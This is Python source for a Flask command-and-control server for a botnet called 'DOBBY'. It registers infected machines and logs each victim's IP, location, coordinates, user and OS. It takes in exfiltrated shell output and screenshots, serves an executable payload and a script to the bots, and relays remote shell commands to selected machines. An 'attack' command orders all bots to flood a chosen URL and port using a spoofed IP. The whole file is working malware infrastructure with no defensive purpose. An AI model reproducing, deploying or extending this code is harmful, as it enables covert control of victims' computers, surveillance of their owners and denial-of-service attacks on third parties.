from flask import Flask, render_template, Response, request, redirect, url_for
from time import sleep
import os
import base64
import codecs
import random
import logging
import threading
import logging.handlers
import pandas as pd
import requests
from bs4 import BeautifulSoup
import socket

SERVER_NAME = "https://maybeabigproject.posydon.repl.co"

#remember to use upticks instead of spaces in the commands.
#DO NOT DELETE THE go.txt FILE!!!!!
def write_encrypted(ciphertext):
  with open("commands.txt", "w") as file:
    file.write(str(ciphertext))
    file.close()


def writef(text):
  with open("output.txt", "a") as file:
    file.write(f"\n{text}")
    file.close()


app = Flask('app')
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
online = []

command = b"""1 notscript 99o ls"""


def write_file(file, content):
  with open(file, "a") as file_:
    file_.write(f"\n{content}")
    file_.close()


@app.route('/recieve', methods=['POST'])
def recieve():
  data = str(base64.b64decode(format(request.data)[2:-1]))[2:-1]
  formatted_data = "\n" + data.replace('\\n', '\n').replace('\\t', '\t') + "\n"
  writef(f"recieved: {formatted_data}")
  return data

@app.route('/recieve_shell', methods=['POST'])
def recieve_shell():
  data = str(base64.b64decode(format(request.data)[2:-1]))[2:-1]
  formatted_data = "\n" + data.replace('\\n', '\n').replace('\\t', '\t') + "\n"
  writef(f"recieved: {formatted_data}")
  return data

@app.route('/recievedata', methods=['POST'])
def recievedata():
  data = str(base64.b64decode(format(request.data)[2:-1]))[2:-1]
  formatted_data = "\n" + data.replace('\\n', '\n').replace('\\t', '\t') + "\n"
  writef(f"recieved: {formatted_data}")
  print(formatted_data)


@app.route('/recieve_ip', methods=['POST'])
def recieve_ip():
  global ip
  data = str(base64.b64decode(format(request.data)[2:-1]))[2:-1]
  formatted_data = data.replace('\\n', '\n').replace('\\t', '\t')
  ip = formatted_data
  writef(ip)
  return ip


@app.route('/file', methods=['POST'])
def file():
  with open("file.exe", "rb") as file:
    return file.read()
    file.close()


@app.route('/recieve_id', methods=['POST'])
def recieve_id():
  global id, online
  data = str(base64.b64decode(format(request.data)[2:-1]))[2:-1]
  #print(f"data var: {data}")
  formatted_data = data.replace('\\n', '\n').replace('\\t', '\t')
  #print(f"formateed_data var: {formatted_data}")
  data_list = formatted_data.split()
  #print(f"data_list var: {data_list}")

  online.append(data_list)
  online = pd.Series(online).drop_duplicates().tolist()

  return "beans"


  # if element[0] == data_list[0]:
  #   try:
  #     element[1] = data_list[1]
  #   except:
  #     element.append(data_list[1])
def write_to_command(content):
  with open("command_storage.txt", "w") as file:
    file.write(content)
    file.close()


@app.route('/command_input', methods=["GET", "POST"])
def command_input():
  if request.method == "POST":
    # getting input with name = fname in HTML form
    first_name = request.form.get("fname")
    write_to_command(first_name)
  #return beans2()"{{ url_for("command_input")}}" method="post"
  return render_template("dash2.html")


@app.route('/message')
def message():
  with open("message.txt", "r") as file:
    return file.read()


@app.route('/clear_output', methods=["GET", "POST"])
def clear_output():
  with open("output.txt", "w") as file:
    file.write("")
    file.close()
  #return beans2()
  return render_template("dash2.html")


@app.route('/recieve_screen', methods=['POST'])
def recieve_screen():
  data = base64.b64decode(format(request.data)[2:-1])
  #print(f'Recieved from client: {data}')
  with open("screenshot" + random.randint(0, 100) + ".txt", "w") as file:
    file.write(data)
    file.close()
  return data

def get_and_write():
  with open("command_storage.txt", "r") as file:
    write_encrypted(base64.b64encode(codecs.encode(file.read())))
    #command = file.read()
    file.close()


def get_routes(link, out, name):
  urls = link
  grab = requests.get(urls)
  soup = BeautifulSoup(grab.text, 'html.parser')
  # opening a file in write mode
  if out == "file":
    f = open(name, "w")
    # traverse paragraphs from soup
    for link in soup.find_all("a"):
      data = link.get('href')
      f.write(data)
      f.write("\n")
    f.close()
    return "routes written succesfully"
  else:
    for link in soup.find_all("a"):
      data = link.get('href')
      return (data)


def get_routes_2(link, name):
  url = link
  reqs = requests.get(url)
  soup = BeautifulSoup(reqs.text, 'html.parser')
  urls = []
  if name == "none":
    for link in soup.find_all('a'):
      print(link.get('href'))
  else:
    with open(name, "w") as file:
      for link in soup.find_all('a'):
        file.write(link.get('href'))
        file.write("\n")
      file.close()


@app.route('/')
def hello_world():
  global command
  write_encrypted(base64.b64encode(command))

  writef(online)
  shell_thread = threading.Thread(target=main_menu, daemon=True)
  shell_thread.start()
  redirect("")
  return render_template('index.html')


def print_menu():
  print(f'''DOBBY by posydon
connected: {len(online)}
server hosted at: {SERVER_NAME}
  ''')


def main_menu():
  global online
  os.system("clear")
  print_menu()
  while True:
    try:
      #print(online)
      sleep(1)
      inst_split = get().split()
      for bot_list in online:
        if bot_list[0] == str(inst_split[0]):
          #print(bot_list)

          #print(inst_split[0])
          #print("printed bo tist")

          bis = get_spec(inst_split[0]).split()
          #bot instruct split- bis
          if bis[0] == "command":
            while True:
              bot_command = get_spec(f"{inst_split[0]}-command")
              if bot_command == "end":
                break
                continue
              elif bot_command == "dobbyscript":
                dobbyscript(inst_split[0])
                continue
              else:
                write_encrypted(
                  base64.b64encode(
                    codecs.encode(f"{inst_split[0]} {bot_command}")))
                send_script_2()

          elif bis[0] == "exit":
            break
            os.system("clear")
            print_menu()

          elif bis[0] == "info":
            for element in online:
              if element[0] == inst_split[0]:
                print(f'''\n
  Bot ID: {inst_split[0]}
  Bot User: {element[9]}
  Bot OS: {element[1]}
  Bot IP: {element[2]}
  Bot location: {element[3]}
  Bot postal: {element[7]}
  Bot timezone: {element[8]}
  Bot latitude: {element[4]}
  Bot longitude: {element[5]}
  Google Maps link: {element[6]}\n
                ''')
          elif bis[0] == "shell":
            while True:
              shell_command = str(input(f"{element[9]}$ "))
              if shell_command == "DOBBY_EXIT":
                break
                continue
              else:           
                write_encrypted(
            base64.b64encode(
                codecs.encode(f"{inst_split[0]} 1 notscript 99sh {shell_command.replace(' ', '`')}")))
                send_script_2()
                sleep(1)
        else:
          continue
          
      if inst_split[0] == "list":
        for element in online:
          print(f"{element[9]}@{element[0]}: {element[1]}")
        print(f"total: {len(online)}")
        sleep(0.5)
      if inst_split[0] == "menu":
        os.system("clear")
        print_menu()
      if inst_split[0] == "attack":
        print("Enter URL:")
        url = get_spec("attack-url")
        ip_host = socket.gethostbyname(url)
        print("Enter Port:")
        port = get_spec("attack-port")
        print("Enter Fake IP:")
        fake_ip = get_spec("attack-fakeip")
        print("Enter Amount Of Threads(the more threads the more power):")
        threads = get_spec("attack-threads")
        write_encrypted(
          base64.b64encode(
            codecs.encode(
              f"ALL 1 notscript attack {threads} {port} {ip_host} {fake_ip}")))
        send_script_2()
        #repeat, port, target, fake_ip
        #75.130.243.162
      if inst_split[0] == "c_cache":
        #Ozzie@)!(  <---do not delete this comment
        online = []
        os.system("clear")
        sleep(0.5)
        print(
          "cache has been cleared. Please allow up to 11 seconds for the connected bots to re-appear on the list. Remember that command 'menu' will refresh the menu."
        )
        sleep(3)
        os.system("clear")
        print_menu()
      if inst_split[0] == "interact":
        write_encrypted(
          base64.b64encode(
            codecs.encode(f"{inst_split[1]} {get_spec(inst_split[1])}")))
        send_script_2()
      if inst_split[0] == "help":
        print('''
  menu commands:
    list: shows all bots connected, with ID and OS.
    menu: clears all output and prints banner, connected count, and server hosted name 
    route: see all routes of a url (under development)
    c_cache: clear the cached bots, requiring them to sign in again. This removes all stale(not online anymore) bots from the list.
    to select a bot, type its ID. bot Ids can be found with the list command.
  bot commands:
    command: send a dobbyscript command to the selected bot
    info: shows info on a certain bot.
    !!to select a bot, type its ID number in the menu!!
        ''')
      if inst_split[0] == "route":

        link = get_spec("route-url")
        print("file name- type none to print:")
        y = get_spec("route-filename")
        if y == 'none':
          get_routes_2(link, "none")
        else:
          get_routes_2(link, y)

    except Exception as e:
      print(e)


def get():
  inputt = input("dobby>$ ")
  return inputt


def get_spec(spec):
  inputt = input(f"dobby-{spec}>$ ")
  return inputt


@app.route('/go')
def go():
  return read_file("go.txt")


def dobbyscript(bot_id):
  with open("script.dobby", "r") as file:
    instruction_list = file.read().split("`")
    print(instruction_list)
    for element in instruction_list:
      print(element)
      write_encrypted(base64.b64encode(codecs.encode(f"{bot_id} {element}")))
      send_script_2()
      sleep(5)


@app.route("/output")
def output():
  with open("output.txt", "r") as file:
    contents = file.read().split()
    formatted_output = ""
    for element in contents:
      formatted_output += "\n"
      formatted_output += element
  return formatted_output


@app.route('/send_script')
def send_script():

  get_and_write()
  try:
    send_script_2()
    return render_template('index.html')
  except:

    return "error"


def clean_go_file():
  with open("go.txt", "w") as file:
    sleep(0.5)
    file.write("")
    file.close()


def send_script_2():
  writef("beans")
  with open("go.txt", "w") as file:
    writef("cheese")
    file.write("go")
    file.close()
    sleep(0.5)
    clean_go_file()


@app.route('/script')
def script():
  return read_file("script.py")


def read_file(file):
  with open(file, "r") as file:
    return file.read()
    file.close()


@app.route('/inst')
def inst():
  return read_file("commands.txt")


app.run(host='0.0.0.0', port=8080)
